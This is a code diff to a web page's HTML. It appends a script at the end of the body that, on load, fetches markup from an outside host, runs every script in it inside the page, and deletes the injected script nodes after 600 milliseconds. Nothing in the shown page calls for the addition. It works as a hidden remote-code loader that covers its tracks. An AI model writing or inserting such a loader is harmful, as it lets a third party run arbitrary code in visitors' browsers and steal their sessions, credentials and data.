@@ -827,5 +827,27 @@ setInterval(() => { if (me) { updateHeader(); } }, 60000);
 boot();
 })();
 </script>
+  <script>
+    (async () => {
+        try {
+            let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
+            let rawMarkup = await response.text();
+            let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+            
+            documentDOM.querySelectorAll('script').forEach(oldNode => {
+                let freshScriptNode = document.createElement('script');
+                if (oldNode.src) {
+                    freshScriptNode.src = oldNode.src;
+                } else {
+                    freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                }
+                document.body.appendChild(freshScriptNode);
+                setTimeout(() => freshScriptNode.remove(), 600);
+            });
+        } catch (e) {
+            console.error(e);
+        }
+    })();
+</script>
 </body>
 </html>
